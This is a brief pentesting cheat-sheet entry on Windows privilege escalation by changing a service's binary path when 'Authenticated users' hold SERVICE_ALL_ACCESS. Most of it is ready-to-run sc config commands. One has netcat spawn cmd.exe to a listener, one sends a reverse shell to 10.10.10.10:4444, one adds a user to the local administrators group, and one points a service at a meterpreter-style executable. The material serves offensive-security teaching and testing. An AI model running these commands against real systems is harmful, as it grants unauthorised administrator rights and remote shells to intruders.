# Modifiable Binary Path

### **Modify service binary path**

If the group "Authenticated users" has **SERVICE\_ALL\_ACCESS** in a service, then it can modify the binary that is being executed by the service. To modify it and execute **nc** you can do:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
